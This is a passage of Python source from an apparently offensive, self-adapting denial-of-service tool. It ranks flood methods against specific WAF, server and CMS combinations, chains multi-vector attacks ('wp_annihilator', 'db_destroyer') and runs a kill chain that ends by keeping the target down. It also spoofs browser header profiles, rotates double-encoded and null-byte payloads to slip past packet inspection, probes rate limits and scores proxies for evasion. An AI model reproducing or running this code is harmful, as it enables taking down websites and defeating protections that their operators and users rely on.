        "latency_trend_slope": 0,     # Positive = target weakening, Negative = recovering
        "recovery_detected": False,   # True when target starts recovering
        "recovery_counter": 0,        # How many times target recovered
        "proxy_method_affinity": {},  # proxy_addr -> {method: success_rate}
        "best_proxy_for_method": {},  # method -> [top proxy addrs]
        "http_methods_pool": ["GET", "POST", "HEAD", "OPTIONS", "PATCH"],
        "method_diversity_score": 0,  # How many unique methods used recently
    }
    
    # ========================================================================
    #  EXPERIENCE DATABASE: Pre-coded knowledge from real-world attack patterns
    #  Format: (waf, server, cms) -> {method: bonus_weight}
    #  This is "muscle memory" - things a veteran attacker would know instantly
    # ========================================================================
    _EXPERIENCE_DB = {
        # WordPress on Apache without WAF = XMLRPC is devastating
        ("none", "apache", "wordpress"):      {"XMLRPC_AMP": 90, "WP_SEARCH": 80, "STRESS": 40},
        ("none", "nginx", "wordpress"):       {"XMLRPC_AMP": 85, "WP_SEARCH": 75, "POST_DYN": 35},
        ("none", "litespeed", "wordpress"):   {"WP_SEARCH": 70, "POST_DYN": 40, "DYN": 35},
        # WordPress behind Cloudflare = Stealth + WP exploits
        ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        ("cloudflare", "apache", "wordpress"):{"STEALTH_JA3": 75, "WP_SEARCH": 55, "XMLRPC_AMP": 45},
        # WordPress behind Wordfence = its own WAF is the weakness
        ("wordfence", "apache", "wordpress"): {"WP_SEARCH": 90, "XMLRPC_AMP": 85, "POST_DYN": 40},
        ("wordfence", "nginx", "wordpress"):  {"WP_SEARCH": 85, "XMLRPC_AMP": 80, "POST_DYN": 35},
        # Naked servers (no CMS, no WAF) = brute force wins
        ("none", "nginx", "custom"):          {"STRESS": 50, "PPS": 40, "GET": 35, "POST_DYN": 30},
        ("none", "apache", "custom"):         {"STRESS": 45, "PPS": 35, "POST_DYN": 35},
        ("none", "litespeed", "custom"):      {"POST_DYN": 40, "DYN": 35, "STRESS": 30},
        ("none", "iis", "custom"):            {"SLOW_V2": 50, "STRESS": 40, "POST_DYN": 35},
        # Akamai targets = only stealth works
        ("akamai", "unknown", "custom"):      {"STEALTH_JA3": 90, "SLOW_V2": 40},
        ("akamai", "nginx", "custom"):        {"STEALTH_JA3": 85, "SLOW_V2": 35, "POST_DYN": 20},
        # Shopify = CDN-heavy, need to exhaust origin
        ("cloudflare", "nginx", "shopify"):   {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 25},
        # Laravel apps = POST-heavy endpoints
        ("none", "nginx", "laravel"):         {"POST_DYN": 60, "POST": 45, "DYN": 40},
        ("cloudflare", "nginx", "laravel"):   {"STEALTH_JA3": 70, "POST_DYN": 45, "DYN": 30},
        # Joomla targets
        ("none", "apache", "joomla"):         {"POST_DYN": 50, "DYN": 45, "STRESS": 30},
        # Drupal targets
        ("none", "apache", "drupal"):         {"POST_DYN": 50, "DYN": 40, "POST": 35},
        # ===== REAL-WORLD SCENARIOS LEARNED FROM FIELD EXPERIENCE =====
        # --- Government / Institution sites (usually Apache + no WAF + old CMS) ---
        ("none", "apache", "custom"):         {"SLOW_V2": 45, "STRESS": 40, "POST_DYN": 35, "PPS": 30},
        ("none", "unknown", "custom"):        {"STRESS": 40, "POST_DYN": 35, "PPS": 30, "GET": 30},
        # --- E-commerce heavy (Magento/OpenCart on Nginx/LiteSpeed) ---
        ("none", "nginx", "custom"):          {"POST_DYN": 50, "DYN": 45, "STRESS": 35, "PPS": 30},
        ("none", "litespeed", "custom"):      {"POST_DYN": 45, "DYN": 40, "STRESS": 30},
        # --- CloudFlare Free Tier (most common protection) ---
        ("cloudflare", "unknown", "custom"):  {"STEALTH_JA3": 75, "SLOW_V2": 35, "POST_DYN": 25, "BOT": 15},
        ("cloudflare", "unknown", "wordpress"):{"STEALTH_JA3": 70, "WP_SEARCH": 55, "XMLRPC_AMP": 45, "SLOW_V2": 20},
        ("cloudflare", "litespeed", "wordpress"):{"STEALTH_JA3": 70, "WP_SEARCH": 60, "POST_DYN": 30},
        ("cloudflare", "cloudflare", "custom"):{"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 20},
        # --- Sucuri + WordPress (very common combo for mid-size sites) ---
        ("sucuri", "apache", "wordpress"):    {"STEALTH_JA3": 55, "WP_SEARCH": 65, "XMLRPC_AMP": 60, "DYN": 25},
        ("sucuri", "nginx", "wordpress"):     {"STEALTH_JA3": 50, "WP_SEARCH": 60, "XMLRPC_AMP": 55, "POST_DYN": 30},
        ("sucuri", "unknown", "wordpress"):   {"STEALTH_JA3": 50, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        ("sucuri", "apache", "custom"):       {"STEALTH_JA3": 50, "POST_DYN": 35, "DYN": 30},
        ("sucuri", "nginx", "custom"):        {"STEALTH_JA3": 50, "POST_DYN": 35, "DYN": 30},
        # --- Imperva / Incapsula (enterprise sites, banks, large e-commerce) ---
        ("imperva", "nginx", "custom"):       {"STEALTH_JA3": 65, "COOKIE": 35, "SLOW_V2": 30, "POST_DYN": 20},
        ("imperva", "apache", "custom"):      {"STEALTH_JA3": 60, "COOKIE": 35, "SLOW_V2": 25},
        ("imperva", "unknown", "custom"):     {"STEALTH_JA3": 65, "COOKIE": 30, "SLOW_V2": 25},
        # --- DDoS-Guard (Russian sites, gaming, crypto) ---
        ("ddosguard", "nginx", "custom"):     {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 15},
        ("ddosguard", "unknown", "custom"):   {"STEALTH_JA3": 75, "SLOW_V2": 35},
        # --- Fastly CDN (media sites, SaaS platforms) ---
        ("fastly", "nginx", "custom"):        {"STEALTH_JA3": 65, "POST_DYN": 30, "DYN": 25},
        ("fastly", "unknown", "custom"):      {"STEALTH_JA3": 60, "POST_DYN": 30},
        # --- AWS WAF (SaaS, startups, API backends) ---
        ("aws_waf", "nginx", "custom"):       {"STEALTH_JA3": 70, "POST_DYN": 35, "DYN": 25, "COOKIE": 15},
        ("aws_waf", "unknown", "custom"):     {"STEALTH_JA3": 65, "POST_DYN": 30, "COOKIE": 20},
        ("aws_waf", "nginx", "laravel"):      {"STEALTH_JA3": 65, "POST_DYN": 50, "POST": 35},
        ("aws_waf", "nginx", "nextjs"):       {"STEALTH_JA3": 70, "POST_DYN": 40, "DYN": 30},
        # --- StackPath (smaller CDN, hosting providers) ---
        ("stackpath", "nginx", "custom"):     {"STEALTH_JA3": 60, "POST_DYN": 35, "SLOW_V2": 25},
        ("stackpath", "apache", "wordpress"): {"STEALTH_JA3": 55, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        # --- Wordfence + Cloudflare Double Protection ---
        ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
        # --- IIS Servers (Corporate / Government / Legacy .NET Apps) ---
        ("none", "iis", "custom"):            {"SLOW_V2": 55, "STRESS": 45, "POST_DYN": 35, "PPS": 25},
        ("aws_waf", "iis", "custom"):         {"STEALTH_JA3": 60, "SLOW_V2": 40, "POST_DYN": 30},
        # --- OpenResty (API Gateways, Kong, custom Lua WAFs) ---
        ("none", "openresty", "custom"):      {"POST_DYN": 45, "DYN": 40, "STRESS": 30, "SLOW_V2": 25},
        ("cloudflare", "openresty", "custom"):{"STEALTH_JA3": 70, "POST_DYN": 30, "SLOW_V2": 25},
        # --- NextJS / React SSR (Modern web apps, Vercel) ---
        ("none", "nginx", "nextjs"):          {"POST_DYN": 50, "DYN": 40, "POST": 35, "STRESS": 25},
        ("cloudflare", "nginx", "nextjs"):    {"STEALTH_JA3": 65, "POST_DYN": 35, "DYN": 25},
        ("none", "unknown", "nextjs"):        {"POST_DYN": 45, "DYN": 40, "POST": 30},
    }
    
    # ========================================================================
    #  COMBO CHAINS: Pre-planned multi-step attack sequences
    #  Instead of random picks, execute coordinated multi-vector strikes
    # ========================================================================
    _COMBO_CHAINS = {
        "stealth_burst":    ["STEALTH_JA3", "STEALTH_JA3", "POST_DYN", "DYN", "STEALTH_JA3"],
        "wp_annihilator":   ["WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "WP_SEARCH"],
        "slow_siege":       ["SLOW_V2", "SLOW_V2", "SLOW_V2", "BOT", "SLOW_V2"],
        "blitz_krieg":      ["STRESS", "PPS", "GET", "POST", "STRESS", "PPS"],
        "polymorphic_wave": ["POST_DYN", "DYN", "STEALTH_JA3", "POST", "GET", "POST_DYN"],
        "cookie_monster":   ["COOKIE", "STEALTH_JA3", "POST_DYN", "COOKIE", "DYN"],
        "bot_swarm":        ["BOT", "GET", "BOT", "STEALTH_JA3", "BOT"],
        "db_destroyer":     ["WP_SEARCH", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "WP_SEARCH"],
    }
    
    def _chaos_save_memory(self):
        """Persist learned intelligence to disk for future attacks on same target."""
        intel = self._chaos_intel
        if intel.get("saved_to_disk") or intel["total_executions"] < 100:
            return
        try:
            target_host = self._target.authority.replace(":", "_").replace(".", "_")
            memory_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
            os.makedirs(memory_dir, exist_ok=True)
            memory_file = os.path.join(memory_dir, f"chaos_memory_{target_host}.json")
            
            # Save only the useful learned data
            save_data = {
                "waf_type": intel.get("waf_type"),
                "server_type": intel.get("server_type"),
                "cms_type": intel.get("cms_type"),
                "has_captcha": intel.get("has_captcha"),
                "has_rate_limit": intel.get("has_rate_limit"),
                "endpoints_discovered": intel.get("endpoints_discovered", []),
                "efficiency_score": intel.get("efficiency_score", {}),
                "best_method": intel.get("best_method"),
                "target_weakpoint": intel.get("target_weakpoint"),
                "response_time_ms": intel.get("response_time_ms", 0),
                "gene_pool": intel.get("gene_pool", [])[:3],
                "rate_limit_threshold": intel.get("rate_limit_threshold"),
                "path_scores": dict(list(intel.get("path_scores", {}).items())[:20]),
            }
            with open(memory_file, 'w') as f:
                json.dump(save_data, f, indent=2)
            intel["saved_to_disk"] = True
        except Exception:
            pass
    
    def _chaos_load_memory(self):
        """Load previously learned intelligence about this target."""
        intel = self._chaos_intel
        try:
            target_host = self._target.authority.replace(":", "_").replace(".", "_")
            memory_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files", f"chaos_memory_{target_host}.json")
            if os.path.exists(memory_file):
                with open(memory_file, 'r') as f:
                    saved = json.load(f)
                # Apply saved intelligence (but don't override fresh recon)
                if not intel.get("recon_done"):
                    for key in ["waf_type", "server_type", "cms_type", "has_captcha", 
                                "has_rate_limit", "endpoints_discovered", "best_method",
                                "target_weakpoint", "response_time_ms"]:
                        if key in saved and saved[key]:
                            intel[key] = saved[key]
                    intel["recon_done"] = True  # Skip slow recon, use memory
                    
                # Always load efficiency scores as starting knowledge
                if "efficiency_score" in saved:
                    intel["efficiency_score"] = saved["efficiency_score"]
                    
                print(f"{bcolors.OKGREEN}[CHAOS] Previous attack memory loaded for {self._target.authority}{bcolors.RESET}")
                return True
        except Exception:
            pass
        return False
    
    def _chaos_build_dynamic_combo(self):
        """Generate a custom combo chain from the top-performing methods."""
        intel = self._chaos_intel
        eff_scores = intel.get("efficiency_score", {})
        
        if len(eff_scores) < 3:
            return None  # Not enough data yet
            
        # Sort by efficiency, take top 3
        sorted_methods = sorted(eff_scores.items(), key=lambda x: -x[1])[:3]
        top_methods = [m[0] for m in sorted_methods]
        
        # Build a custom combo: heavy on the best, sprinkled with variety
        combo = []
        for _ in range(5):
            # 60% chance for the best method, 25% for second, 15% for third
            roll = randint(1, 100)
            if roll <= 60:
                combo.append(top_methods[0])
            elif roll <= 85:
                combo.append(top_methods[1])
            else:
                combo.append(top_methods[2])
        
        return combo
    
    def _chaos_wave_control(self):
        """Multi-wave attack pattern: RISE -> PEAK -> FALL -> REST -> repeat.
        Mimics natural traffic fluctuation to avoid flat-line detection."""
        intel = self._chaos_intel
        intel["wave_tick"] += 1
        tick = intel["wave_tick"]
        
        wave = intel.get("wave_state", "RISE")
        
        if wave == "RISE" and tick >= randint(15, 25):
            intel["wave_state"] = "PEAK"
            intel["wave_tick"] = 0
            intel["temperature"] = min(intel["temperature"] + 0.2, 1.0)
        elif wave == "PEAK" and tick >= randint(30, 50):
            intel["wave_state"] = "FALL"
            intel["wave_tick"] = 0
        elif wave == "FALL" and tick >= randint(10, 20):
            intel["wave_state"] = "REST"
            intel["wave_tick"] = 0
            intel["temperature"] = max(intel["temperature"] - 0.15, 0.2)
        elif wave == "REST" and tick >= randint(5, 10):
            intel["wave_state"] = "RISE"
            intel["wave_tick"] = 0
            intel["temperature"] = min(intel["temperature"] + 0.1, 0.8)
            
        return intel["wave_state"]

    # ========================================================================
    #  BROWSER PROFILE DATABASE: Complete header sets for different browsers
    #  WAFs correlate User-Agent with header order and values
    #  Using mismatched headers is an instant bot detection signal
    # ========================================================================
    _BROWSER_PROFILES = [
        {   # Chrome 130 Windows
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Chrome 130 macOS
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"macOS"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Firefox 131 Windows
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Firefox 131 Linux
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Safari 17 macOS
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Edge 130 Windows
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
            "Sec-Ch-Ua": '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Chrome Mobile Android
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1", "Sec-Ch-Ua-Platform": '"Android"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
    ]
    
    def _chaos_get_browser_profile(self):
        """Select a random complete browser profile for header consistency."""
        return dict(randchoice(self._BROWSER_PROFILES))
    
    def _chaos_kill_chain(self):
        """Structured Kill Chain Protocol with specific objectives per phase.
        Unlike random phase transitions, this follows a deliberate attack doctrine."""
        intel = self._chaos_intel
        tick = intel["total_executions"]
        phase = intel.get("kill_chain_phase", "RECON")
        
        # Phase transitions based on observable conditions, not just tick count
        if phase == "RECON" and intel.get("recon_done"):
            intel["kill_chain_phase"] = "PROBE"
            intel["kill_chain_objective"] = "Test all methods, discover rate limits and weakpoints"
            
        elif phase == "PROBE" and tick > 50:
            intel["kill_chain_phase"] = "WEAKEN"
            intel["kill_chain_objective"] = "Exhaust connection pool and consume server memory"
            
        elif phase == "WEAKEN":
            # Advance to BREACH when target shows signs of struggle
            if intel.get("target_getting_weaker") or (intel.get("health_history") and len(intel["health_history"]) > 3 and intel["health_history"][-1] > intel.get("response_time_ms", 500) * 1.8):
                intel["kill_chain_phase"] = "BREACH"
                intel["kill_chain_objective"] = "Exploit weakpoint with maximum concentrated force"
                
        elif phase == "BREACH":
            # Advance to OVERWHELM when we see 5xx or target_is_down
            if intel.get("consecutive_5xx", 0) >= 2 or intel.get("target_is_down"):
                intel["kill_chain_phase"] = "OVERWHELM"
                intel["kill_chain_objective"] = "Full spectrum attack to ensure complete collapse"
                
        elif phase == "OVERWHELM":
            # Advance to SUSTAIN_KILL after confirmed down
            if intel.get("target_is_down"):
                intel["kill_chain_phase"] = "SUSTAIN_KILL"
                intel["kill_chain_objective"] = "Maintain minimum pressure to prevent target recovery"
                
        elif phase == "SUSTAIN_KILL":
            # If target recovers, go back to BREACH
            if intel.get("recovery_detected"):
                intel["kill_chain_phase"] = "BREACH"
                intel["kill_chain_objective"] = "Target recovering! Re-engaging with concentrated force"
                intel["recovery_counter"] += 1
                
        return intel["kill_chain_phase"]
    
    def _chaos_predict_ttd(self):
        """Predict Time-To-Down: estimate when the target will collapse based on latency trends.
        Uses linear regression on health_history to extrapolate when response_time hits infinity."""
        intel = self._chaos_intel
        hp = intel.get("health_history", [])
        
        if len(hp) < 5:
            return None
            
        # Calculate slope of latency trend (simple linear regression)
        n = len(hp)
        x_vals = list(range(n))
        x_mean = sum(x_vals) / n
        y_mean = sum(hp) / n
        
        numerator = sum((x - x_mean) * (y - y_mean) for x, y in zip(x_vals, hp))
        denominator = sum((x - x_mean) ** 2 for x in x_vals)
        
        if denominator == 0:
            return None
            
        slope = numerator / denominator
        intel["latency_trend_slope"] = slope
        
        # Detect recovery: slope is negative (latency dropping = target recovering)
        if slope < -50 and len(hp) > 5:
            intel["recovery_detected"] = True
        else:
            intel["recovery_detected"] = False
        
        # Predict when latency reaches "critical" (10000ms = effectively down)
        if slope > 0:
            current_latency = hp[-1]
            critical_latency = 10000
            remaining_ms = critical_latency - current_latency
            
            if remaining_ms > 0 and slope > 0:
                # Each health check is ~30 seconds apart
                checks_to_down = remaining_ms / slope
                seconds_to_down = int(checks_to_down * 30)
                intel["predicted_ttd"] = max(seconds_to_down, 0)
                return seconds_to_down
                
        intel["predicted_ttd"] = None
        return None
    
    def _chaos_track_proxy_affinity(self, method_name, proxy_addr, success):
        """Track which proxies work best with which attack methods.
        Some proxies may be on cleaner IP ranges that certain WAFs trust more."""
        intel = self._chaos_intel
        if not proxy_addr:
            return
            
        key = str(proxy_addr)
        if key not in intel["proxy_method_affinity"]:
            intel["proxy_method_affinity"][key] = {}
        if method_name not in intel["proxy_method_affinity"][key]:
            intel["proxy_method_affinity"][key][method_name] = {"s": 0, "t": 0}
            
        intel["proxy_method_affinity"][key][method_name]["t"] += 1
        if success:
            intel["proxy_method_affinity"][key][method_name]["s"] += 1
            
        # Update best proxy for method (every 50 attempts)
        if intel["proxy_method_affinity"][key][method_name]["t"] % 50 == 0:
            self._chaos_compute_best_proxies(method_name)
    
    def _chaos_compute_best_proxies(self, method_name):
        """Find the top 3 proxies for a given method."""
        intel = self._chaos_intel
        proxy_scores = []
        
        for proxy_key, methods in intel["proxy_method_affinity"].items():
            if method_name in methods:
                data = methods[method_name]
                if data["t"] >= 10:  # Need at least 10 attempts
                    rate = data["s"] / data["t"]
                    proxy_scores.append((proxy_key, rate))
                    
        proxy_scores.sort(key=lambda x: -x[1])
        intel["best_proxy_for_method"][method_name] = [p[0] for p in proxy_scores[:3]]
    
    def _chaos_http_method_expand(self):
        """Generate HTTP requests using HEAD, OPTIONS, PATCH to diversify attack surface.
        Each HTTP method consumes server resources differently."""
        try:
            s = self.open_connection()
            profile = self._chaos_get_browser_profile()
            path = self.get_random_target_path()
            if not path.startswith("/"):
                path = "/" + path
            
            # Pick a non-standard HTTP method
            http_method = randchoice(["HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
            referer = self._chaos_get_smart_referer()
            
            payload = (f"{http_method} {path} HTTP/1.1\r\n"
                       f"Host: {self._target.authority}\r\n"
                       f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
                       f"Accept: {profile.get('Accept', '*/*')}\r\n"
                       f"Referer: {referer}\r\n"
                       f"Connection: keep-alive\r\n")
            
            # Add body for PATCH/PUT
            if http_method in ("PATCH", "PUT"):
                body = self._generate_post_payload()
                payload += f"Content-Type: application/json\r\n"
                payload += f"Content-Length: {len(body)}\r\n"
                payload += f"\r\n{body}"
            else:
                payload += f"\r\n"
                
            Tools.send(s, payload.encode("utf-8"))
            REQUESTS_SENT.increment()
            Tools.safe_close(s)
        except Exception:
            pass
    
    def _chaos_evolve_weights(self):
        """Genetic Algorithm: Evolve optimal weight configurations across generations.
        Top-performing weight sets breed and mutate to create superior strategies."""
        intel = self._chaos_intel
        
        # Only evolve every 100 executions
        if intel["total_executions"] % 100 != 0 or intel["total_executions"] < 100:
            return
            
        intel["generation"] += 1
        
        # Score current DNA based on combined metrics
        eff_scores = intel.get("efficiency_score", {})
        if not eff_scores:
            return
            
        avg_efficiency = sum(eff_scores.values()) / max(len(eff_scores), 1)
        burn_penalty = len(BURNED_PROXIES) * 2
        damage_bonus = intel.get("damage_score", 0) / 10
        streak_bonus = intel.get("successful_streak", 0)
        
        fitness = int((avg_efficiency * 100) + damage_bonus + streak_bonus - burn_penalty)
        
        # Store current weights as DNA
        current_plan = self._chaos_plan()
        dna_entry = {"weights": dict(current_plan), "fitness": fitness, "gen": intel["generation"]}
        
        # Add to gene pool
        intel["gene_pool"].append(dna_entry)
        
        # Keep only top 5 performing DNA
        intel["gene_pool"] = sorted(intel["gene_pool"], key=lambda x: -x["fitness"])[:5]
        
        if len(intel["gene_pool"]) >= 2:
            # Crossover: Breed top 2 DNAs
            parent_a = intel["gene_pool"][0]["weights"]
            parent_b = intel["gene_pool"][1]["weights"]
            
            child = {}
            for method in set(list(parent_a.keys()) + list(parent_b.keys())):
                # 50% chance from each parent
                if randint(0, 1) == 0:
                    child[method] = parent_a.get(method, 0)
                else:
                    child[method] = parent_b.get(method, 0)
                    
                # 15% mutation chance
                if randint(1, 100) <= 15:
                    mutation = randint(-20, 30)
                    child[method] = max(child[method] + mutation, 0)
            
            intel["current_dna"] = child
            
            if int(REQUESTS_SENT) > 0 and intel["generation"] % 3 == 0:
                print(f"{bcolors.OKCYAN}[CHAOS DNA] Generation {intel['generation']} | Best Fitness: {intel['gene_pool'][0]['fitness']} | Pool Size: {len(intel['gene_pool'])}{bcolors.RESET}")
    
    def _chaos_probe_rate_limit(self):
        """Carefully probe the exact rate limit threshold of the target.
        Sends controlled bursts to find the maximum safe RPS."""
        intel = self._chaos_intel
        
        if intel.get("rate_limit_probed"):
            return
        
        # Only probe once, early in the attack
        if intel["total_executions"] != 50:
            return
            
        intel["rate_limit_probed"] = True
        
        try:
            import urllib.request
            target_url = f"{self._target.scheme}://{self._target.authority}/"
            
            # Send increasing burst sizes and check when we get blocked
            threshold = 0
            for burst_size in [5, 10, 15, 20, 30]:
                blocked = False
                for i in range(burst_size):
                    try:
                        req = urllib.request.Request(target_url, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
                        })
                        with urllib.request.urlopen(req, timeout=4) as resp:
                            if resp.status in (403, 429):
                                blocked = True
                                break
                    except Exception:
                        blocked = True
                        break
                        
                if blocked:
                    threshold = burst_size - 1
                    break
                else:
                    threshold = burst_size
                    
            intel["rate_limit_threshold"] = max(threshold, 3)
            
            if int(REQUESTS_SENT) < 100:
                if threshold < 10:
                    limit_str = f"{bcolors.FAIL}STRICT ({threshold} req/burst){bcolors.RESET}"
                elif threshold < 20:
                    limit_str = f"{bcolors.WARNING}MODERATE ({threshold} req/burst){bcolors.RESET}"
                else:
                    limit_str = f"{bcolors.OKGREEN}LENIENT ({threshold}+ req/burst){bcolors.RESET}"
                print(f"[CHAOS PROBE] Rate limit threshold: {limit_str}")
                
        except Exception:
            intel["rate_limit_threshold"] = 5  # Assume strict
    
    def _chaos_multi_path_targeting(self):
        """Generate a queue of (path, method_hint) pairs for simultaneous multi-path attacks.
        Instead of hitting one endpoint, distribute across multiple for maximum backend stress."""
        intel = self._chaos_intel
        
        if intel.get("multi_path_queue"):
            return  # Queue still active
            
        # Gather all known paths
        all_paths = []
        uncached = intel.get("uncached_paths", [])
        discovered = intel.get("endpoints_discovered", [])
        
        if hasattr(self, 'crawled_paths') and self.crawled_paths:
            all_paths.extend(self.crawled_paths[:10])
        all_paths.extend(uncached)
        all_paths.extend(discovered)
        
        if not all_paths:
            return
            
        # Remove duplicates
        all_paths = list(set(all_paths))
        
        # Build multi-path queue with method hints
        queue = []
        for path in all_paths[:8]:  # Max 8 paths per cycle
            path_lower = path.lower()
            
            # Match paths with optimal methods
            if 'xmlrpc' in path_lower:
                queue.append((path, "XMLRPC_AMP"))
            elif 'search' in path_lower or '?s=' in path_lower or '?q=' in path_lower:
                queue.append((path, "WP_SEARCH"))
            elif 'api' in path_lower or 'graphql' in path_lower or 'rest' in path_lower:
                queue.append((path, "POST_DYN"))
            elif 'login' in path_lower or 'admin' in path_lower:
                queue.append((path, "POST_DYN"))
            elif 'cart' in path_lower or 'checkout' in path_lower:
                queue.append((path, "POST_DYN"))
            else:
                queue.append((path, "DYN"))
        
        # Shuffle to avoid predictable ordering
        from random import shuffle
        shuffle(queue)
        intel["multi_path_queue"] = queue
    
    def _chaos_encode_payload(self, payload_str):
        """Rotate payload encoding to evade Deep Packet Inspection (DPI).
        WAFs often only inspect one encoding format."""
        intel = self._chaos_intel
        intel["encoding_rotation"] += 1
        variant = intel["encoding_rotation"] % 6
        
        if variant == 0:
            return payload_str  # Raw
        elif variant == 1:
            # URL-encode special characters
            from urllib.parse import quote
            return quote(payload_str, safe='{}":,')
        elif variant == 2:
            # Double-encode (bypasses single-decode WAF rules)
            from urllib.parse import quote
            return quote(quote(payload_str, safe=''), safe='')
        elif variant == 3:
            # Add null bytes (some WAFs truncate at null)
            return payload_str.replace('"', '%00"')
        elif variant == 4:
            # Unicode escape sequences
            return payload_str.replace('a', '\u0061').replace('e', '\u0065')
        else:
            # Chunked-style padding
            return '  ' + payload_str + '  '
    
    def _chaos_score_path(self, path, success):
        """Track success rate per path for intelligent path selection."""
        intel = self._chaos_intel
        if path not in intel["path_scores"]:
            intel["path_scores"][path] = {"success": 0, "total": 0}
        intel["path_scores"][path]["total"] += 1
        if success:
            intel["path_scores"][path]["success"] += 1

    def _chaos_analyze_block_page(self, response_body):
        """Analyze WAF block pages to identify exact rules being triggered.
        This lets us understand WHY we're being blocked and adapt specifically."""
        intel = self._chaos_intel
        body = response_body.lower() if response_body else ""
        
        # WAF-specific block page signatures
        signatures = {
            # Cloudflare
            "attention required": ("cloudflare", "js_challenge"),
            "ray id": ("cloudflare", "ray_block"),
            "enable javascript and cookies": ("cloudflare", "browser_check"),
            "error 1020": ("cloudflare", "firewall_rule"),
            "error 1015": ("cloudflare", "rate_limited"),
            "error 1012": ("cloudflare", "origin_unreachable"),
            # Akamai
            "access denied": ("akamai", "access_denied"),
            "reference #": ("akamai", "ref_block"),
            # Imperva/Incapsula
            "incapsula incident": ("imperva", "incident"),
            "powered by incapsula": ("imperva", "bot_block"),
            "_incapsula_resource": ("imperva", "resource_check"),
            # Sucuri
            "sucuri website firewall": ("sucuri", "waf_block"),
            "access denied - sucuri": ("sucuri", "access_denied"),
            # Wordfence
            "blocked by wordfence": ("wordfence", "rule_block"),
            "wordfence - firewall": ("wordfence", "firewall"),
            "your access to this site": ("wordfence", "ip_block"),
            # ModSecurity
            "mod_security": ("modsec", "rule_match"),
            "not acceptable": ("modsec", "406_block"),
            "request rejected": ("modsec", "rejected"),
            # AWS WAF
            "request blocked": ("aws_waf", "blocked"),
            # DDoS-Guard
            "ddos-guard": ("ddosguard", "challenge"),
            # Generic
            "403 forbidden": ("generic", "forbidden"),
            "429 too many": ("generic", "rate_limit"),
            "captcha": ("generic", "captcha_required"),
        }
        
        detected = []
        for sig, (waf_name, rule_type) in signatures.items():
            if sig in body:
                detected.append({"waf": waf_name, "rule": rule_type, "signal": sig})
                
        if detected:
            intel["waf_block_signatures"] = detected
            # Extract specific rules triggered
            rules = [d["rule"] for d in detected]
            intel["waf_rules_triggered"] = rules
            
            # Auto-correct WAF type if recon missed it
            primary_waf = detected[0]["waf"]
            if intel.get("waf_type") == "none" and primary_waf != "generic":
                intel["waf_type"] = primary_waf
                if int(REQUESTS_SENT) < 50:
